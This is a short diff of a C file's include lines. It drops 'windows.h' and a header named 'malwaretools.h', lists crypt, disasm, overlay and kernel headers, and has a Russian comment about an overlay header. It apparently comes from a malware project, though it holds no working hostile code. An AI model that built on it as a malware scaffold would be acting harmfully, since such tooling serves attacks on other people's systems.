@@ -1,12 +1,8 @@
-#include <windows.h>
-
-#include <common/baseoverlay.h>
-#include <common/mem.h>
-#include <common/crypt.h>
-#include <common/malwaretools.h>
-#include <common/disasm.h>
-
-
+#include "common/rl_kernel.h"
+#include "common/mem.h"
+#include "common/baseoverlay.h"
+#include "common/crypt.h"
+#include "common/disasm.h"
 
 //Обший заголовк для оверлея.
 # pragma pack(push, 1)
